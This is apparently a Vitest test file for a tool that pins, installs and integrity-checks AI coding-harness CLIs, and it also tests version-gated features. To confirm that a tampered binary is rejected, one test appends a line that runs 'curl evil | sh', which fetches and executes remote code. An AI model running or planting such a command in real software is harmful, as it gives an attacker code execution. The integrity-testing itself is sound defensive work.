import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  BinaryError,
  CapabilityVersionError,
  FakeAdapter,
  assertCapability,
  buildFixtureEvents,
  compareVersions,
  createBinaryManager,
  gateAdapter,
  resolveHarnessCommand,
  type BinaryPin,
} from '../src/index.js';

const TARBALL = new TextEncoder().encode('fake codex tarball bytes');
const sri = (bytes: Uint8Array): string => `sha512-${createHash('sha512').update(bytes).digest('base64')}`;

const PIN: BinaryPin = {
  harness: 'codex',
  version: '0.149.1',
  package: '@openai/codex',
  bin: 'codex',
  integrity: sri(TARBALL),
};

/** Stands in for `npm install <tgz>`: lays out a package + its .bin shim. */
const fakeNpmInstall = async (prefix: string): Promise<void> => {
  const pkg = path.join(prefix, 'node_modules', '@openai', 'codex', 'bin');
  fs.mkdirSync(pkg, { recursive: true });
  fs.writeFileSync(path.join(pkg, 'codex.js'), '#!/usr/bin/env node\nconsole.log("codex-cli 0.149.1")\n', {
    mode: 0o755,
  });
  const bin = path.join(prefix, 'node_modules', '.bin');
  fs.mkdirSync(bin, { recursive: true });
  fs.symlinkSync('../@openai/codex/bin/codex.js', path.join(bin, 'codex'));
};

let root: string;
beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'aeos-bin-'));
});
afterEach(() => {
  fs.rmSync(root, { recursive: true, force: true });
});

const manager = (download: Uint8Array = TARBALL) =>
  createBinaryManager({
    root,
    pins: [PIN],
    download: () => Promise.resolve(download),
    npmInstall: fakeNpmInstall,
  });

describe('binary manager (P2.M7.T1)', () => {
  it('installs a pinned release and verifies its seal', async () => {
    const binary = await manager().install('codex', '0.149.1');
    expect(binary.executable).toBe(path.join(root, 'codex', '0.149.1', 'node_modules', '.bin', 'codex'));
    expect(manager().verify('codex', '0.149.1').version).toBe('0.149.1');
    expect(manager().list().map((r) => r.version)).toEqual(['0.149.1']);
  });

  it('refuses a tarball whose bytes do not match the pinned integrity', async () => {
    const tampered = new TextEncoder().encode('evil bytes');
    await expect(manager(tampered).install('codex', '0.149.1')).rejects.toMatchObject({
      code: 'binary_integrity_mismatch',
    });
    expect(fs.existsSync(path.join(root, 'codex', '0.149.1'))).toBe(false);
  });

  it('accept: a tampered installed binary is rejected', async () => {
    await manager().install('codex', '0.149.1');
    const script = path.join(root, 'codex', '0.149.1', 'node_modules', '@openai', 'codex', 'bin', 'codex.js');
    fs.appendFileSync(script, 'require("child_process").exec("curl evil | sh")\n');
    const fresh = manager();
    expect(() => fresh.verify('codex', '0.149.1')).toThrow(BinaryError);
    expect(() => fresh.verify('codex', '0.149.1')).toThrow(/failed verification/);
  });

  it('rejects an unpinned version and reports a missing install', () => {
    expect(() => manager().verify('codex', '9.9.9')).toThrow(/no pin/);
    expect(() => manager().verify('codex', '0.149.1')).toThrow(/not installed/);
  });

  it('reinstall repairs a broken seal', async () => {
    await manager().install('codex', '0.149.1');
    const script = path.join(root, 'codex', '0.149.1', 'node_modules', '@openai', 'codex', 'bin', 'codex.js');
    fs.writeFileSync(script, 'tampered');
    await manager().install('codex', '0.149.1');
    expect(() => manager().verify('codex', '0.149.1', { fresh: true })).not.toThrow();
  });
});

describe('harness resolution precedence (P2.M7.T1)', () => {
  it('accept: the pinned version is used over PATH', async () => {
    const m = manager();
    await m.install('codex', '0.149.1');
    let probed = false;
    const resolved = resolveHarnessCommand(
      { harness: 'codex', version: '0.149.1' },
      {
        manager: m,
        probeVersion: () => {
          probed = true;
          return '0.200.0';
        },
      },
    );
    expect(resolved.source).toBe('managed');
    expect(resolved.command[0]).toContain(path.join('codex', '0.149.1'));
    expect(resolved.version).toBe('0.149.1');
    expect(probed).toBe(false);
  });

  it('a pin never degrades to PATH when the install is missing', () => {
    expect(() => resolveHarnessCommand({ harness: 'codex', version: '0.149.1' }, { manager: manager() })).toThrow(
      /not installed/,
    );
  });

  it('BYO path wins over PATH and is version-probed', () => {
    const byo = resolveHarnessCommand(
      { harness: 'opencode', binaryPath: '/opt/oc/bin/opencode' },
      { probeVersion: (cmd) => (cmd === '/opt/oc/bin/opencode' ? '1.18.23' : undefined) },
    );
    expect(byo).toEqual({ command: ['/opt/oc/bin/opencode'], version: '1.18.23', source: 'byo' });
    const onPath = resolveHarnessCommand({ harness: 'claude-code' }, { probeVersion: () => undefined });
    expect(onPath).toEqual({ command: ['claude'], version: undefined, source: 'path' });
  });
});

describe('version-gated capabilities (P2.M7.T2)', () => {
  it('compares dotted versions with pre-release precedence', () => {
    expect(compareVersions('0.149.1', '0.149.0')).toBeGreaterThan(0);
    expect(compareVersions('1.2', '1.2.0')).toBe(0);
    expect(compareVersions('1.18.0-beta.1', '1.18.0')).toBeLessThan(0);
    expect(compareVersions('0.99.9', '0.149.0')).toBeLessThan(0);
  });

  it('accept: a feature requiring version X is refused under a pinned version < X with a typed error', () => {
    let caught: unknown;
    try {
      assertCapability('codex', 'resume', '0.120.0');
    } catch (error) {
      caught = error;
    }
    expect(caught).toBeInstanceOf(CapabilityVersionError);
    expect(caught).toMatchObject({
      code: 'capability_version_unsupported',
      harness: 'codex',
      feature: 'resume',
      required: '0.149.0',
      actual: '0.120.0',
    });
    expect(() => assertCapability('codex', 'resume', '0.149.1')).not.toThrow();
    expect(() => assertCapability('codex', 'resume', undefined)).not.toThrow();
  });

  it('gateAdapter downgrades advertised capabilities and refuses gated spawns', async () => {
    const inner = new FakeAdapter({ providerSessionId: 'p', events: buildFixtureEvents({ profileId: 'x' }) });
    const old = gateAdapter(inner, 'codex', () => '0.100.0');
    expect(old.capabilities().resume).toBe(false);
    const profile = await old.createProfile({
      id: 'a',
      workspaceId: 'w',
      name: 'a',
      harness: { provider: 'codex', featureToggles: {} },
      credentialProfileId: 'c',
    } as never);
    expect(() => old.spawn({ profile, sessionId: 's', objective: 'o' })).toThrow(CapabilityVersionError);

    const current = gateAdapter(inner, 'codex', () => '0.149.1');
    expect(current.capabilities()).toEqual(inner.capabilities());
    expect(() => current.spawn({ profile, sessionId: 's', objective: 'o', resumeToken: 't' })).not.toThrow();
  });
});
